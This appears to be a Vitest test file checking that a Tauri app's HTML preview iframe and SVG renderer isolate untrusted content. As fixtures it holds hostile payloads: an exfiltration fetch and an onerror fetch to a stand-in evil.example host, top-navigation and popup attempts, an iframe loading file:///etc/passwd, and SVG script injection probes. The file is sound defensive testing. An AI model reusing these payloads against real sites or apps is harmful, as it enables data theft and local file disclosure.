// @vitest-environment jsdom
import { cleanup, render, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { SandboxFrame } from "../SandboxFrame";

vi.mock("react-i18next", () => ({
  initReactI18next: { type: "3rdParty", init: vi.fn() },
  useTranslation: () => ({
    t: (key: string) => key,
    i18n: { exists: () => false },
  }),
}));

const registered: string[] = [];
const invokeMock = vi.fn((command: string, args: Record<string, unknown>) => {
  if (command === "preview_artifact_register") {
    registered.push(String(args.source));
    return "artifact-1";
  }
  if (command === "preview_artifact_revoke") return Promise.resolve(null);
  return Promise.reject(new Error(`unexpected command ${command}`));
});

vi.mock("../../../runtime/tauri-ipc", () => ({
  tauriInvoke: (command: string, args?: Record<string, unknown>) => invokeMock(command, args ?? {}),
}));

afterEach(() => {
  cleanup();
  delete (window as { __TAURI_INTERNALS__?: unknown }).__TAURI_INTERNALS__;
});

const MALICIOUS_HTML = `<!DOCTYPE html>
<html><head><script>
  // Every probe below must fail inside the sandbox:
  // - parent storage access, top navigation, popup, external fetch.
  try { parent.localStorage.getItem('x'); } catch (e) {}
  try { top.location = 'https://evil.example'; } catch (e) {}
  try { window.open('https://evil.example'); } catch (e) {}
  fetch('https://evil.example/exfil').catch(() => undefined);
</script></head>
<body><p>hello</p></body></html>`;

describe("SandboxFrame security boundary", () => {
  it("never sets allow-same-origin on the iframe", async () => {
    const { container } = render(<SandboxFrame source={MALICIOUS_HTML} />);
    await waitFor(() => expect(container.querySelector("iframe")).not.toBeNull());
    const sandbox = container.querySelector("iframe")?.getAttribute("sandbox") ?? "";
    expect(sandbox).not.toContain("allow-same-origin");
    expect(sandbox).toContain("allow-scripts");
    expect(sandbox).not.toContain("allow-popups");
    expect(sandbox).not.toContain("allow-forms");
    expect(sandbox).not.toContain("allow-downloads");
  });

  it("registers untrusted HTML with the Rust artifact store instead of srcdoc", async () => {
    (window as { __TAURI_INTERNALS__?: unknown }).__TAURI_INTERNALS__ = {};
    const { container } = render(<SandboxFrame source={MALICIOUS_HTML} />);
    await waitFor(() =>
      expect(invokeMock).toHaveBeenCalledWith("preview_artifact_register", {
        source: MALICIOUS_HTML,
      }),
    );
    const frame = container.querySelector("iframe");
    expect(frame?.getAttribute("srcdoc")).toBeNull();
    expect(frame?.getAttribute("src")).toContain("preview://localhost/artifact/");
  });

  it("does not crash on frames with onload/onerror script handlers", async () => {
    const hostile = `<img src=x onerror="fetch('https://evil.example')"><iframe src="file:///etc/passwd"></iframe>`;
    const { container } = render(<SandboxFrame source={hostile} />);
    await waitFor(() => expect(container.querySelector("iframe")).not.toBeNull());
    expect(container.querySelector(".preview-fallback-text")).toBeNull();
  });

  it("falls back to a blob URL when the artifact store is unavailable", async () => {
    (window as { __TAURI_INTERNALS__?: unknown }).__TAURI_INTERNALS__ = {};
    invokeMock.mockReset();
    invokeMock.mockRejectedValue(new Error("store down"));
    const { container } = render(<SandboxFrame source="<p>x</p>" />);
    await waitFor(() => expect(container.querySelector("iframe")).not.toBeNull());
    expect(container.querySelector("iframe")?.getAttribute("src")).toMatch(/^blob:/);
    expect(container.querySelector("iframe")?.getAttribute("srcdoc")).toBeNull();
  });
});

describe("SvgPreview safe rendering", () => {
  it("renders SVG through an image context (scripts cannot execute)", async () => {
    const { SvgPreview } = await import("../renderers/SvgPreview");
    const { container } = render(
      <SvgPreview
        source={
          '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><circle r="5"/></svg>'
        }
      />,
    );
    await waitFor(() => expect(container.querySelector("img")).not.toBeNull());
    // No inline SVG in the DOM → no script execution path in the app document.
    expect(container.querySelector("svg")).toBeNull();
  });

  it("rejects oversized SVG sources", async () => {
    const { SvgPreview, MAX_SVG_BYTES } = await import("../renderers/SvgPreview");
    const { container } = render(<SvgPreview source={"x".repeat(MAX_SVG_BYTES + 1)} />);
    await waitFor(() => expect(container.textContent).toContain("preview.tooLarge"));
  });
});
